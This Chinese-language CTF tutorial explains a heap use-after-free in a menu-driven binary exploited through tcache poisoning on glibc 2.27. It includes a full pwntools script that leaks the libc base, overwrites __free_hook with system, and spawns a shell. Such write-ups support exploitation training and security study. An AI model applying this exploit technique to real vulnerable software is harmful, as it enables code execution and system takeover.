<!-- date: 2026-07-23; tags: heap, glibc, pwn -->
# Heap UAF 入門 — tcache poisoning 打 __free_hook

> **題型**：UAF（use-after-free）+ 可控 malloc/free/edit
> **glibc**：2.27（tcache，無 key、無 safe-linking）
> **目標**：任意寫 → 改 `__free_hook` 為 `system` → `free("/bin/sh")` 彈 shell

---

## 1. 觀察原語（牌組第一步：找到能讀/寫的原語）

題目給了一個選單：`add / free / edit / show`。關鍵在 free 之後**沒有把指標清成 NULL** → chunk 被放回 tcache，但我們仍能 `edit` 它 = 寫入一個 freed chunk 的 `fd`。

| 動作 | 能力 |
|------|------|
| add(size) | malloc 任意大小 |
| free(idx) | 放回 tcache，**指標未清零** ← 漏洞 |
| edit(idx) | 對 freed chunk 寫入（改 fd） |
| show(idx) | 印出內容（可洩漏） |

## 2. tcache poisoning 心法

tcache 是單向鏈：`tcache->entries[i]` → chunkA.fd → chunkB … 。
free 一個 chunk 後改它的 `fd`，下一次同 size 的 malloc 會把 `fd` 當成下一塊回傳。**連拿兩次 malloc，第二次就落在我指定的位址**。

```
free(A)                 tcache: A
edit(A, fd = &target)   tcache: A -> target
malloc()  -> A
malloc()  -> target     ← 拿到 target 當可寫記憶體
```

## 3. exploit 腳本（pwntools）

```python
from pwn import *

context.binary = elf = ELF('./chall')
libc = ELF('./libc-2.27.so')
io = process('./chall')          # 本地打通後改 remote('host', 1337)

def add(sz):      ...            # 依選單封裝
def free(i):      ...
def edit(i, d):   ...
def show(i):      ...

# --- (1) 洩漏 libc base：free 一個 unsorted chunk，show 出 main_arena 指標 ---
add(0x100)                        # idx0，夠大不進 tcache
add(0x20)                         # idx1，防合併到 top
free(0)
libc.address = u64(show(0)[:8].ljust(8, b'\x00')) - 0x3ebca0
log.success(f'libc base = {hex(libc.address)}')

# --- (2) tcache poisoning：把 __free_hook 塞進鏈 ---
add(0x30)                         # idx2
free(2)
edit(2, p64(libc.sym.__free_hook))   # fd -> __free_hook
add(0x30)                         # 消耗 idx2
add(0x30)                         # idx3 落在 __free_hook

# --- (3) __free_hook = system，free("/bin/sh") ---
edit(3, p64(libc.sym.system))
add(0x30)                         # idx4
edit(4, b'/bin/sh\x00')
free(4)                           # free_hook(system) 觸發 -> system("/bin/sh")

io.interactive()
```

## 4. 踩到的坑

- **libc 偏移打不通**：`0x3ebca0` 是「這顆 libc」的 main_arena→base 偏移，換 libc 就變。用 `p &main_arena` 或 `one_gadget` / `libc-database` 對版本。⭐（這是我最常卡的地方）
- tcache 在 2.29+ 加了 `key` 檢查 double free、2.32+ 加 safe-linking（fd 被 `>>12 xor` 加密）→ 本手法要調整，不是同一版能無腦套。

## 5. 一句話總結（機器喀一聲）

> UAF 讓 freed chunk 的 `fd` 可控 → tcache 是條「我能改指向的單向鏈」→ 於是 malloc 變成**任意位址分配**，`__free_hook` 是最順手的控制流劫持點。

---
*本篇是模板示範，數字/偏移請以你自己那顆 libc 為準。*
